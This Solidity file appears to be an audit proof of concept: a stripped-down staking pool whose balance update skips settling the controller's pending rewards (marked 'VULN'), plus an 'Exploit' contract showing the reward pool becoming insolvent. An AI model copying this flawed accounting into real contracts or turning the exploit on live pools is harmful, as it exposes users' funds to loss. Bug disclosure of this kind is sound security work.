// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
contract SDLPoolPrimary { address public constant CONTROLLER=address(0xCAFE); mapping(address=>uint) public effectiveBalances; uint public totalEffectiveBalance; uint public rewardPerToken; uint public rewardPool; mapping(address=>uint) public paid;
 function seed() external {effectiveBalances[CONTROLLER]=1000;totalEffectiveBalance=1500;rewardPerToken=1;rewardPool=1000;}
 function handleIncomingUpdate(uint256, int256 change) external { if(change>0){effectiveBalances[CONTROLLER]+=uint256(change); totalEffectiveBalance+=uint256(change);} } // @> VULN: effective balance changes without first settling controller rewards at the old rewardPerToken.
 function withdrawControllerRewards() external {uint due=effectiveBalances[CONTROLLER]*(rewardPerToken-paid[CONTROLLER]); require(rewardPool>=due,"insufficient reward pool");rewardPool-=due;paid[CONTROLLER]=rewardPerToken;}
}
contract Exploit {SDLPoolPrimary public pool; constructor(){pool=new SDLPoolPrimary();} function run() external {pool.seed();pool.handleIncomingUpdate(0,1000);bool stuck;try pool.withdrawControllerRewards(){}catch{stuck=true;}require(stuck,"distribution should be insolvent");require(pool.effectiveBalances(address(0xCAFE))==2000,"update missing");}}
